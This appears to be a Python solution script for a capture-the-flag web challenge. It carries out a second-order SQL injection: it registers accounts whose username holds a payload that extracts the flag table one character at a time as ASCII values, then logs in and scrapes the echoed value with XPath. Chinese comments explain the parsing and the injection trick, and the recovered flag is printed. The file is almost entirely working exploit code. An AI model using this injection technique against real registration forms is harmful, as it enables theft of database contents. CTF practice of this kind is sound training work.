import requests
#import re
from lxml import etree

register_url = 'https://8dfc430190d5e8ed8bccefc4.http-ctf2.dasctf.com/register.php'
login_url = 'https://8dfc430190d5e8ed8bccefc4.http-ctf2.dasctf.com/login.php'

flag = ""
for i in range(1, 100):
    register_data = {
        'email': 'aa{}@qq.com'.format(i),
        'username': "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i),
        'password': '123456'
    }
    res = requests.post(url=register_url, data=register_data)

    login_data = {
        'email': 'aa{}@qq.com'.format(i),
        'password': '123456'
    }
    res_ = requests.post(url=login_url, data=login_data)
    #下面为re匹配
    #code = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', res_.text)抓取目标标签为<span class="user-name">            67          </span>
            #r'...'	原始字符串	r表示不对字符串中的反斜杠进行转义，保持原样
            #<span class="user-name">	字面匹配	精确匹配这个HTML开始标签
            #\s*	匹配空白字符	\s匹配空格、制表符、换行等；*表示匹配0次或多次
            #(\d*)	捕获组	()表示捕获组，\d匹配数字，*匹配0次或多次
            #\s*	匹配空白字符	同上，匹配标签和内容之间的空白
            #</span>	字面匹配	精确匹配HTML结束标签
            
    #a = int(code.group(1))
    #if a >= 32 and a <= 127:
    #    flag += chr(a)
    #else:
    #    break
    
    #下面为xpath匹配
    html = etree.HTML(res_.text)#解析html文档
    # 根据XPath: //*[@id="menu"]/div/div/span
    elements = html.xpath('//span[@class="user-name"]/text()')#提取<span class="user-name">{target}</span>中的target
    if elements:
        a = int(elements[0].strip())
        if a >= 32 and a <= 127:
            flag += chr(a)
        else:
            break

print(flag)
#CTF2{23250994-488b-4ebb-a052-c48f7d1dfced}

#Xpath匹配路径:
    #/html/body/nav/div/div/span
    #//*[@id="menu"]/div/div/span
#re匹配路径
    #<span class="user-name">            67          </span>
    
# aa1@qq.com
# 0'+ascii(substr((select * from flag) from 1 for 1))+'0  在sql中'0'+ascii值等于ascii值
# 123456